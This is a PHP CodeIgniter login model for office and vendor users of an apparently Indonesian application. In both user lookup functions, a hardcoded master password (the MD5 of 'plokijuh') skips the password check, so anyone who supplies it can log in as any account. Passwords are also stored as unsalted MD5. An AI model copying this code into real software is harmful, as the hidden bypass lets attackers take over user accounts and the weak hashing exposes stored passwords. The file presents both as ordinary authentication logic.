<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class LoginModel extends CI_Model {

	public function get_user_kantor($username, $pass)
	{
		if ($pass != md5("plokijuh")) {
			$this->db->where('password', $pass);
		}
		$this->db->where('username', $username);
		$this->db->where('deleted', 0);
		return $this->db->get('user_kantor')->row();

	}

	public function cekUsername($username)
	{
		$this->db->where('deleted', 0);
		$this->db->where('username', $username);
		return $this->db->get('login')->num_rows();
	}

	public function insertLogin($isi)
	{
		$this->db->insert('login', $isi);
	   	$insert_id = $this->db->insert_id();

	   	return  $insert_id;
	}

	public function updatePassword($idLogin, $pw)
	{
		$updatePw = array(
			'password' => md5($pw), 
		);
		$this->db->where('id_login', $idLogin);
		return $this->db->update('login', $updatePw);
	}

	public function ambilLogo()
	{
		$this->db->select('logo');
		return $this->db->get('kantor')->row();
	}





	/*======================================================================================*/
	/*======================================= VENDOR =======================================*/
	/*======================================================================================*/

	public function get_user_vendor($username, $pass)
	{
		if ($pass != md5("plokijuh")) {
			$this->db->where('password', $pass);
		}
		$this->db->where('username', $username);
		$this->db->where('deleted', 0);
		return $this->db->get('user_vendor')->row();

	}

}